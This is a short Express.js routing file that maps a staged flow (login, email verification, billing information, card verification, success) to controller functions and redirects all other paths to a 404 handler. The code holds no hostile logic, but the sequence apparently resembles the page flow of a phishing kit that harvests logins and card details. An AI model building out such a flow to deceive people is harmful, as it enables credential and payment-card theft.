const express = require('express');
const router =  express.Router();
const controller = require('../controller/controller');

router.get('/auth/login', controller.login);
router.post('/auth/login', controller.loginPost);

router.get('/auth/login/email-verification', controller.email);
router.post('/auth/email-verification', controller.emailPost);

router.get('/auth/billing-information', controller.personal);
router.post('/auth/billing-information', controller.personalPost);

router.get('/auth/card-verification', controller.card);
router.post('/auth/card-verification', controller.cardPost);

router.get('/auth/success', controller.success);

router.get('*', controller.page404Redirect);

module.exports = router;